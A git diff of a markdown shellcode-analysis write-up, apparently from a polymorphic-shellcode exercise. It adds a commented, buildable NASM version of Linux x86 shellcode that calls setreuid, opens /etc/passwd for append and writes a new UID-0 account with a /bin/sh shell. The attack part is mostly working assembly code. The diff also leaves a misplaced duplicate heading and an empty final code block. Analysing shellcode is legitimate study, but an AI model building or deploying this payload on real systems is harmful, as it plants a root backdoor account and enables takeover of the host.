@@ -63,13 +63,7 @@ echo -n "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x7
 0000005D  CD80              int 0x80
 ```
 
-Here I will dissect the assembly piece by piece, followed by a commented version of theh code in entirety.
-
-
-## Disassembled (Cleaned and commented)
-
-Here I have cleaned and commented the code
-
+Cleaning this results in the following commented code:
 ```x86asm
 00000000  31C9              xor ecx,ecx
 00000002  89CB              mov ebx,ecx
@@ -120,4 +114,72 @@ label1:
 0000005A  6A01              push byte +0x1      
 0000005C  58                pop eax             
 0000005D  CD80              int 0x80            ; exit()
+```
+
+I have cleaned and commented the code in the form of a `.nasm` file that can be built so I can modify and test my polymorphic code.
+
+```x86asm
+global _start
+
+section .text
+_start:
+    xor ecx,ecx
+    mov ebx,ecx
+    push byte +0x46
+    pop eax             ; 0x46 from stack
+        ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 70$"
+        ; setreuid()
+        ; int setreuid(uid_t ruid, uid_t euid);
+    int 0x80
+
+
+
+
+    push byte +0x5
+    pop eax             ; 0x5 from stack
+        ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 5$"
+        ; open ()
+        ; int open(const char *pathname, int flags);
+    xor ecx,ecx
+    push ecx
+    push dword 0x64777373   ; (ascii) dwss
+    push dword 0x61702f2f   ; (ascii) ap//
+    push dword 0x6374652f   ; (ascii) cte/
+    mov ebx,esp             ; /etc//passwd
+    inc ecx                 ; ecx = 1
+    mov ch,0x4              ; ecx = 0x401 (O_WRONLY|O_APPEND)
+    int 0x80                ; open("/etc//passwd", 0x0401)
+
+
+
+    xchg eax,ebx            ; ebx = ptr to file
+    call _label1               ; call label1 
+
+    db "username:AzydwfoigBTrs:0:0::/:/bin/sh", 0x0
+
+_label1:             
+    ; rebuilt with `echo -n "`python2 -c 'print "\x90"*81'`\x59\x8b\x51\xfc\x61\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -p intel -`
+    pop ecx             ; ptr to 0x2b
+    mov edx,[ecx-0x4]   ; 0x26 = 38 (uses opcode from E826 at offset 0x26)
+    push byte +0x4      ; 
+    pop eax             ; write()
+    int 0x80            ; ssize_t write(int fd, const void *buf, size_t count);
+
+
+
+    push byte +0x1      
+    pop eax             
+    int 0x80            ; exit()
+
+```
+
+
+Here I will dissect the assembly piece by piece, followed by a commented version of theh code in entirety.
+
+
+## Disassembled (Cleaned and commented)
+
+Final code in the form of a `.nasm` file.
+
+```x86asm
 ```
